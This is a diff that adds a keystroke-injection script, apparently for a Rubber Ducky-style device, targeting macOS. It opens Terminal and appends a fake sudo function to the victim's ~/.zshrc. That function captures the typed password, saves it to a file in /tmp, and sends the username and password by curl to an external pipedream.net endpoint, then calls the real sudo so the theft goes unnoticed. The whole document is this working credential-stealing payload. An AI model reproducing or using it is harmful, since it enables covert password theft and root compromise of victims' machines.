@@ -1,0 +1,18 @@
+
+
+DEFINE SUDO_LOCATION /usr/bin/sudo
+DEFINE SHELL zsh
+DEFINE SHELL_PROFILE ~/Desktop/tmp.txt
+
+DELAY 10000
+COMMAND SPACE
+DELAY 450
+STRING terminal
+ENTER
+DELAY 450
+COMMAND N
+DELAY 250
+STRING echo "function sudo ()\n{\n    realsudo=\"/usr/bin/sudo\";\n    echo -n \"Password:\";\n    read -s inputPasswd;\n    printf \"\\\n\";\n    printf '%s\\\n' \"\$USER : \$inputPasswd\" > /tmp/hackedPasswd.txt;\n    curl -s \"https://ency2ujxb6buv.x.pipedream.net/?q=\$USER:\$inputPasswd\" > /dev/null 2>&1;\n    \$realsudo -S <<< \"\$inputPasswd\" -u root zsh -c \"exit\" > /dev/null 2>&1\n    \$realsudo \"\${@:1}\"\n}\n" >> ~/.zshrc
+ENTER
+DELAY 400
+
